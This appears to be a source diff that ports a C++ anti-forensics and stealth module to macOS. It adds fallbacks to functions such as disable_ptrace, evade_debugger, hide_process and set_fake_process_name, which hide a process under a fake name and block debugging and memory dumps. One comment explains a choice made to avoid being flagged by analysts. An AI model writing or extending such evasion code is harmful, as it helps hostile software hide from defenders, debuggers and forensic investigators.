@@ -79,6 +79,9 @@
 #  include <dirent.h>
 #  include <pwd.h>
 #  include <fstream>
+#  include <netinet/in.h>
+#  include <arpa/inet.h>
+#  include <pthread.h>
 #  ifdef __linux__
 #    include <sys/prctl.h>
 #    include <sys/vfs.h>
@@ -1086,7 +1089,9 @@ AntiForensics::StorageType AntiForensics::detect_storage_type(const std::string&
     if (type == DRIVE_REMOTE) return StorageType::UNKNOWN;
     return StorageType::UNKNOWN;
 #else
-    // Check filesystem type for CoW detection
+    // Check filesystem type for CoW detection (Linux only — macOS uses
+    // a different statfs layout and APFS doesn't match the BTRFS/ZFS magic).
+#  ifdef __linux__
     struct statfs sfs{};
     if (statfs(path.c_str(), &sfs) == 0) {
         // BTRFS_SUPER_MAGIC = 0x9123683E, ZFS has no standard magic but common value
@@ -1095,6 +1100,7 @@ AntiForensics::StorageType AntiForensics::detect_storage_type(const std::string&
             return StorageType::COW_FS;
         }
     }
+#  endif
 
     // Determine block device and check rotational flag
     struct stat st{};
@@ -1369,8 +1375,12 @@ bool AntiForensics::secure_zero_memory(void* ptr, size_t size) {
 bool AntiForensics::disable_ptrace() {
 #ifdef _WIN32
     return false;
-#else
+#elif defined(__linux__)
     return prctl(PR_SET_DUMPABLE, 0, 0, 0, 0) == 0;
+#else
+    // macOS: PT_DENY_ATTACH via ptrace() works but triggers SIGKILL on attach
+    // and is widely flagged by analysts; left as a no-op here.
+    return false;
 #endif
 }
 
@@ -1382,8 +1392,11 @@ bool AntiForensics::set_process_dumpable(bool dumpable) {
 #ifdef _WIN32
     (void)dumpable;
     return false;
-#else
+#elif defined(__linux__)
     return prctl(PR_SET_DUMPABLE, dumpable ? 1 : 0, 0, 0, 0) == 0;
+#else
+    (void)dumpable;
+    return false;
 #endif
 }
 
@@ -2001,8 +2014,10 @@ bool MonitoringDetector::evade_debugger() {
         return false;
     }
     return true;
-#else
+#elif defined(__linux__)
     return prctl(PR_SET_DUMPABLE, 0, 0, 0, 0) == 0;
+#else
+    return false;
 #endif
 }
 
@@ -2029,17 +2044,22 @@ ProcessStealth::ProcessStealth() {}
 bool ProcessStealth::hide_process() {
 #ifdef _WIN32
     return false;
-#else
+#elif defined(__linux__)
     return prctl(PR_SET_NAME, config_.fake_name.c_str(), 0, 0, 0) == 0;
+#else
+    return pthread_setname_np(config_.fake_name.substr(0, 63).c_str()) == 0;
 #endif
 }
 
 bool ProcessStealth::unhide_process() {
 #ifdef _WIN32
     return false;
-#else
+#elif defined(__linux__)
     if (original_name_.empty()) return false;
     return prctl(PR_SET_NAME, original_name_.c_str(), 0, 0, 0) == 0;
+#else
+    if (original_name_.empty()) return false;
+    return pthread_setname_np(original_name_.substr(0, 63).c_str()) == 0;
 #endif
 }
 
@@ -2361,11 +2381,16 @@ bool ProcessStealth::set_fake_process_name(const std::string& name) {
 #else  // POSIX
     if (original_name_.empty()) {
         char buf[16]{};
+#  ifdef __linux__
         prctl(PR_GET_NAME, buf, 0, 0, 0);
+#  else
+        pthread_getname_np(pthread_self(), buf, sizeof(buf));
+#  endif
         original_name_ = buf;
     }
     config_.fake_name = name;
 
+#  ifdef __linux__
     // Write to /proc/self/comm (Linux kernel >= 3.8; max 15 chars + null)
     {
         int fd = open("/proc/self/comm", O_WRONLY | O_TRUNC);
@@ -2379,6 +2404,10 @@ bool ProcessStealth::set_fake_process_name(const std::string& name) {
 
     // prctl(PR_SET_NAME) sets the thread name visible in ps/top (max 15 chars)
     return prctl(PR_SET_NAME, name.c_str(), 0, 0, 0) == 0;
+#  else
+    // macOS: pthread_setname_np only sets the *current* thread's name (no thread arg)
+    return pthread_setname_np(name.substr(0, 63).c_str()) == 0;
+#  endif
 #endif
 }
 
